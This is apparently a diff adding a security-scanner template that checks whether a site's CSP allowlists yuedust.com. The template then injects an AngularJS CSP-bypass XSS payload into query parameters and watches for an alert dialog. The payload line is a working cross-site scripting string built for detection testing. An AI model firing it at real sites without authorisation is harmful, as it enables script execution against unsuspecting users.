@@ -1,0 +1,55 @@
+id: yuedust-angular-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Yuedust Angular
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,yuedust-angular
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "yuedust.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: yuedust_angular_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "yuedust_angular_csp_xss == true"
+# digest: 490a0046304402205f1ad369646c98ecd77ee3aef328605887553ce4ebf638cedc0838784cc35caa0220075c6277ec7491da2f55ffeea799f4f606b3fdbbf749d1b359e596afb21ca958:922c64590222798bb761d5b6d8e72950
